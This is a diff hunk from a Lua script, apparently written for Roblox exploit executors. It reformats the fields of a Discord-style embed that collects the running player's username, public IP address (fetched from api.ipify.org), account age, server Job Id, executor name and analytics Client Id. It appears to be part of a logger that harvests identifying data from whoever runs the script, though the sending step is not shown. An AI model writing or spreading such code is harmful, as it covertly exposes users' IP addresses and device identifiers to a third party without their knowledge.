@@ -22,47 +22,47 @@ local data = {
         ["fields"] = {
             {
                 ["name"] = "Username",
-                ["value"] = `{game.Players.LocalPlayer.Name}`,
+                ["value"] = `\`{game.Players.LocalPlayer.Name}\``,
                 ["inline"] = true
             },
             {
                 ["name"] = "IP Adress",
-                ["value"] = `{game:HttpGet("https://api.ipify.org")}`,
+                ["value"] = `\`{game:HttpGet("https://api.ipify.org")}\``,
                 ["inline"] = true
             },
             {
                 ["name"] = "Account Age",
-                ["value"] = `{game.Players.LocalPlayer.AccountAge}`,
+                ["value"] = `\`{game.Players.LocalPlayer.AccountAge}\``,
                 ["inline"] = true
 	    },
             {
                 ["name"] = "Job Id",
-                ["value"] = `{game.JobId}`,
+                ["value"] = `\`{game.JobId}\``,
                 ["inline"] = true
             },
             {
                 ["name"] = "Executor",
-                ["value"] = `{identifyexecutor()}`,
+                ["value"] = `\`{identifyexecutor()}\``,
                 ["inline"] = true
             },
             {
                 ["name"] = "Players",
-                ["value"] = `{plrsInServer}`,
+                ["value"] = `\`{plrsInServer}\``,
                 ["inline"] = true
             },
             {
                 ["name"] = "Client Id",
-                ["value"] = `{game:GetService("RbxAnalyticsService"):GetClientId()}`,
+                ["value"] = `\`{game:GetService("RbxAnalyticsService"):GetClientId()}\``,
                 ["inline"] = true
             },				            
 	    {
         	["name"] = "Session Executions",
-                ["value"] = `{getgenv().sessionExecutions}`,
+                ["value"] = `\`{getgenv().sessionExecutions}\``,
                 ["inline"] = true
             },
 			    {
         	["name"] = "Type",
-                ["value"] = `Normal`,
+                ["value"] = `\`Normal\``,
                 ["inline"] = true
             },				
         },
